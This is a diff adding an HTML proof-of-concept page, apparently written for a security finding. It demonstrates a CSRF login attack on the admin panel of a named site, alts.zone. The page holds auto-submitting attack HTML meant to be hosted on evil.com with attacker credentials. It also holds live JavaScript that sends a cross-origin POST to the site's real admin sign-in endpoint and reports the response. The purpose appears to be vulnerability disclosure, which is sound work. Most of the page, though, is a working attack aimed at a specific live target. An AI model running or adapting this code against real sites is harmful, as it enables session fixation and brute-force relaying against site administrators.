@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC: CSRF Admin Login — alts.zone (F-091/092)</title>
+<style>
+  body { font-family: monospace; background: #0d1117; color: #c9d1d9;
+         max-width: 860px; margin: 40px auto; padding: 20px; }
+  h1 { color: #f85149; font-size: 1.2rem; }
+  .meta { background: #161b22; border: 1px solid #30363d; border-radius: 6px;
+          padding: 16px; margin: 16px 0; font-size: 0.85rem; line-height: 1.6; }
+  .meta strong { color: #f0f6fc; }
+  pre { background: #161b22; border: 1px solid #30363d; border-radius: 6px;
+        padding: 16px; overflow-x: auto; font-size: 0.82rem; line-height: 1.5; }
+  #result { background: #0d3320; border: 1px solid #3fb950; border-radius: 6px;
+            padding: 14px; margin-top: 16px; white-space: pre-wrap; min-height: 60px; }
+  button { background: #f85149; color: #fff; border: none; padding: 10px 22px;
+           border-radius: 6px; cursor: pointer; font-size: 0.9rem; margin-top: 12px; }
+  .warn { color: #e3b341; font-size: 0.8rem; margin-top: 8px; }
+</style>
+</head>
+<body>
+<h1>🚨 PoC: CSRF Login Attack — alts.zone Admin Panel</h1>
+<div class="meta">
+  <strong>Finding:</strong> F-091 / F-092 · Severity: CRITICAL<br>
+  <strong>Target:</strong> POST https://alts.zone/admin/session/signin<br>
+  <strong>Root cause:</strong> No CSRF token on admin login form + no Origin/Referer validation<br>
+  <strong>Impact:</strong> An attacker can embed this page on any domain. When an admin visits,
+  the browser silently sends a cross-origin POST to the admin login endpoint. The server processes it
+  without challenge. An attacker using their own credentials can authenticate the admin's browser
+  session (CSRF login / session fixation), or relay brute-force attempts from the victim's IP
+  (bypassing IP-based lockouts on the attacker's own machine).
+</div>
+
+<p>Click <strong>Run PoC</strong> to send a cross-origin form POST to alts.zone admin login from this page.</p>
+<p class="warn">⚠ This uses a non-existent username — the server will return an error, proving the request was processed without a CSRF block.</p>
+<button onclick="runPoc()">▶ Run PoC (safe — wrong credentials)</button>
+<div id="result">Waiting...</div>
+
+<h3 style="margin-top:24px;color:#8b949e;">Attack HTML (what an attacker would embed)</h3>
+<pre>&lt;!-- Attacker hosts this on evil.com --&gt;
+&lt;form id="x" method="POST"
+      action="https://alts.zone/admin/session/signin"&gt;
+  &lt;input name="username" value="ATTACKER_USERNAME"&gt;
+  &lt;input name="password" value="ATTACKER_PASSWORD"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById("x").submit();&lt;/script&gt;
+&lt;!-- Victim admin visits evil.com → their browser sends the POST →
+     if credentials valid, attacker has a session on admin panel --&gt;</pre>
+
+<script>
+async function runPoc() {
+  document.getElementById("result").textContent = "Sending cross-origin POST...";
+  try {
+    const body = new URLSearchParams({
+      username: "blockaguard_csrf_poc_user_do_not_use",
+      password: "blockaguard_csrf_poc_pass_do_not_use"
+    });
+    const start = performance.now();
+    const r = await fetch("https://alts.zone/admin/session/signin", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: body.toString(),
+      referrerPolicy: "no-referrer"
+    });
+    const elapsed = (performance.now() - start).toFixed(0);
+    const txt = await r.text();
+    document.getElementById("result").textContent =
+      "✅ PoC CONFIRMED — Server responded (no CSRF block)\n\n" +
+      "HTTP Status : " + r.status + "\n" +
+      "Time        : " + elapsed + "ms\n" +
+      "Response    : " + txt.slice(0, 500) + "\n\n" +
+      "If HTTP status is 200 and body contains an error message — the POST was PROCESSED.\n" +
+      "A CSRF block would return HTTP 403 or redirect to a CSRF error page.";
+  } catch(e) {
+    document.getElementById("result").textContent = "CORS blocked: " + e.message +
+      "\n(This means the browser's CORS preflight blocked the request — that would be a mitigating factor)";
+  }
+}
+</script>
+</body>
+</html>
